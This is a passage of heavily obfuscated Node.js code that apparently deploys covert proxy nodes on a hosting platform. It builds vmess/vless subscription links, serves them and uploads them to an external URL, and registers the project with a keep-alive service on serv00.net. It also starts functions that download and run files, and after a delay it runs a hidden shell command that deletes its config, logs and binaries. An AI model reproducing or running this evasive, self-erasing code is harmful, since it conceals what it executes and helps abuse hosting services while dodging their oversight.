_0x2a1b59[_0x1e6c23(_0x2da8b1._0x2a5182)][_0x1e6c23(_0x2da8b1._0x23f918)]+'_'+_0x2a1b59[_0x1e6c23(0x20a)][_0x1e6c23(0x186)];}catch(_0x439d40){try{const _0x9a54be=await axios[_0x1e6c23(0x198)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x9a54be[_0x1e6c23(_0x2da8b1._0x2a5182)]&&_0x9a54be[_0x1e6c23(_0x2da8b1._0x599f25)][_0x1e6c23(0x190)]==='success'&&_0x9a54be[_0x1e6c23(0x20a)][_0x1e6c23(0x20f)]&&_0x9a54be[_0x1e6c23(_0x2da8b1._0x5aa911)]['org'])return _0x9a54be[_0x1e6c23(0x20a)]['countryCode']+'_'+_0x9a54be[_0x1e6c23(_0x2da8b1._0x5aa911)][_0x1e6c23(0x186)];}catch(_0x4ebc0e){}}return _0x1e6c23(0x1cd);}async function _0x19f660(_0x3d12ca){const _0x17f347={_0x47ddaf:0x188,_0x30c829:0x1bd,_0x28e8ae:0x1db,_0x4bd3ee:0x170,_0x176fb4:0x169,_0x1ae7bc:0x18c,_0x11eb17:0x217,_0x1e112a:0x165,_0x1b1c66:0x20d,_0x6a01cc:0x18c,_0x3103e6:0x191},_0x42d66b=await _0x4c56e0(),_0x550f9e=NAME?NAME+'-'+_0x42d66b:_0x42d66b;return new Promise(_0x4fa8f1=>{setTimeout(()=>{const _0x3a054c={_0x377278:0x191},_0x2db725=_0x1569,_0x24372e={'v':'2','ps':''+_0x550f9e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2db725(0x176),'net':'ws','type':_0x2db725(0x176),'host':_0x3d12ca,'path':_0x2db725(0x18e),'tls':_0x2db725(_0x17f347._0x47ddaf),'sni':_0x3d12ca,'alpn':'','fp':'firefox'},_0x194d8a=_0x2db725(0x20c)+UUID+'@'+CFIP+':'+CFPORT+_0x2db725(_0x17f347._0x30c829)+_0x3d12ca+_0x2db725(0x217)+_0x3d12ca+_0x2db725(_0x17f347._0x28e8ae)+_0x550f9e+'\x0a\x0avmess://'+Buffer[_0x2db725(_0x17f347._0x4bd3ee)](JSON[_0x2db725(_0x17f347._0x176fb4)](_0x24372e))[_0x2db725(0x191)](_0x2db725(_0x17f347._0x1ae7bc))+_0x2db725(0x1d2)+UUID+'@'+CFIP+':'+CFPORT+_0x2db725(0x1be)+_0x3d12ca+_0x2db725(_0x17f347._0x11eb17)+_0x3d12ca+_0x2db725(_0x17f347._0x1e112a)+_0x550f9e+_0x2db725(0x200);console[_0x2db725(_0x17f347._0x1b1c66)](Buffer['from'](_0x194d8a)[_0x2db725(0x191)](_0x2db725(_0x17f347._0x6a01cc))),fs['writeFileSync'](subPath,Buffer['from'](_0x194d8a)[_0x2db725(_0x17f347._0x3103e6)]('base64')),console['log'](FILE_PATH+_0x2db725(0x18f)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4f3647,_0x31c59f)=>{const _0x5bc600=_0x2db725,_0x35b01e=Buffer['from'](_0x194d8a)[_0x5bc600(_0x3a054c._0x377278)](_0x5bc600(0x18c));_0x31c59f['set']('Content-Type',_0x5bc600(0x16c)),_0x31c59f[_0x5bc600(0x219)](_0x35b01e);}),_0x4fa8f1(_0x194d8a);},0x7d0);});}}async function uploadNodes(){const _0x2b4518={_0x270beb:0x1d8,_0x4381d6:0x167,_0x44e65f:0x190,_0xcbaef3:0x17d,_0x522590:0x17f,_0x732b9e:0x169,_0x29407a:0x168,_0x2e9405:0x173,_0x5843f9:0x20d},_0x451b4c=_0x1e0154;if(UPLOAD_URL&&PROJECT_URL){const _0x80647d=PROJECT_URL+'/'+SUB_PATH,_0x3baed0={'subscription':[_0x80647d]};try{const _0x31686a=await axios['post'](UPLOAD_URL+_0x451b4c(_0x2b4518._0x270beb),_0x3baed0,{'headers':{'Content-Type':'application/json'}});return _0x31686a&&_0x31686a[_0x451b4c(0x190)]===0xc8?(console[_0x451b4c(0x20d)](_0x451b4c(0x211)),_0x31686a):null;}catch(_0x5a3222){if(_0x5a3222[_0x451b4c(0x167)]){if(_0x5a3222[_0x451b4c(_0x2b4518._0x4381d6)][_0x451b4c(_0x2b4518._0x44e65f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2470f1=fs[_0x451b4c(_0x2b4518._0xcbaef3)](listPath,'utf-8'),_0x335c6f=_0x2470f1[_0x451b4c(0x1f3)]('\x0a')[_0x451b4c(_0x2b4518._0x522590)](_0x2190dc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x451b4c(0x1e7)](_0x2190dc));if(_0x335c6f[_0x451b4c(0x172)]===0x0)return;const _0x10c51a=JSON[_0x451b4c(_0x2b4518._0x732b9e)]({'nodes':_0x335c6f});try{const _0xcad262=await axios[_0x451b4c(_0x2b4518._0x29407a)](UPLOAD_URL+'/api/add-nodes',_0x10c51a,{'headers':{'Content-Type':_0x451b4c(_0x2b4518._0x2e9405)}});return _0xcad262&&_0xcad262[_0x451b4c(0x190)]===0xc8?(console[_0x451b4c(_0x2b4518._0x5843f9)]('Nodes\x20uploaded\x20successfully'),_0xcad262):null;}catch(_0x156baa){return null;}}else return;}}function cleanFiles(){const _0x28a1f8={_0x1239aa:0x225,_0x4d9404:0x225,_0xea923a:0x1c9,_0x3d0784:0x1b1,_0x3eb422:0x1f0};setTimeout(()=>{const _0xb45a0e={_0xe54398:0x20d,_0x52575e:0x1c2},_0x544277={_0xf8874e:0x175,_0x3f6820:0x20d,_0x14c4cb:0x1c2,_0x5f3f26:0x1cb},_0x11f157=_0x1569,_0x4613eb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4613eb[_0x11f157(_0x28a1f8._0x1239aa)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4613eb[_0x11f157(_0x28a1f8._0x4d9404)](phpPath);process[_0x11f157(0x1c8)]===_0x11f157(_0x28a1f8._0xea923a)?exec(_0x11f157(0x1e4)+_0x4613eb['join']('\x20')+_0x11f157(0x1df),_0xfe1be2=>{const _0x3e8918=_0x11f157;console[_0x3e8918(_0x544277._0xf8874e)](),console[_0x3e8918(_0x544277._0x3f6820)](_0x3e8918(_0x544277._0x14c4cb)),console['log'](_0x3e8918(_0x544277._0x5f3f26));}):exec(_0x11f157(_0x28a1f8._0x3d0784)+_0x4613eb[_0x11f157(_0x28a1f8._0x3eb422)]('\x20')+'\x20>/dev/null\x202>&1',_0x29dcaf=>{const _0x224fec=_0x11f157;console[_0x224fec(0x175)](),console[_0x224fec(_0xb45a0e._0xe54398)](_0x224fec(_0xb45a0e._0x52575e)),console[_0x224fec(_0xb45a0e._0xe54398)](_0x224fec(0x1cb));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2676d1={_0x106cea:0x207,_0x10b070:0x168,_0x10fe96:0x173,_0x5f17d2:0x20d,_0x3305c5:0x16b},_0x41429b=_0x1e0154;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x41429b(0x20d)](_0x41429b(_0x2676d1._0x106cea));return;}try{const _0x17ac0d=await axios[_0x41429b(_0x2676d1._0x10b070)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x41429b(_0x2676d1._0x10fe96)}});return console[_0x41429b(_0x2676d1._0x5f17d2)](_0x41429b(0x178)),_0x17ac0d;}catch(_0x5cd59d){return console[_0x41429b(_0x2676d1._0x3305c5)](_0x41429b(0x1d7)+_0x5cd59d['message']),null;}}async function startserver(){const _0x2666c0=_0x1e0154;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2baadd){console['error'](_0x2666c0(0x199),_0x2baadd);}}function _0x1569(_0x317309,_0x15e057){const _0x3b9bb0=_0x3b9b();return _0x1569=function(_0x156990,_0x33bdb8){_0x156990=_0x156990-0x165;let _0x2fa8b9=_0x3b9bb0[_0x156990];return _0x2fa8b9;},_0x1569(_0x317309,_0x15e057);}startserver()[_0x1e0154(0x189)](_0x419641=>{const _0x5955a7={_0x4f89aa:0x1c7},_0x492ac0=_0x1e0154;console[_0x492ac0(0x16b)](_0x492ac0(_0x5955a7._0x4f89aa),_0x419641);}),app[_0x1e0154(0x1fc)](PORT,()=>console[_0x1e0154(0x20d)](_0x1e0154(0x1b3)+PORT+'!'));
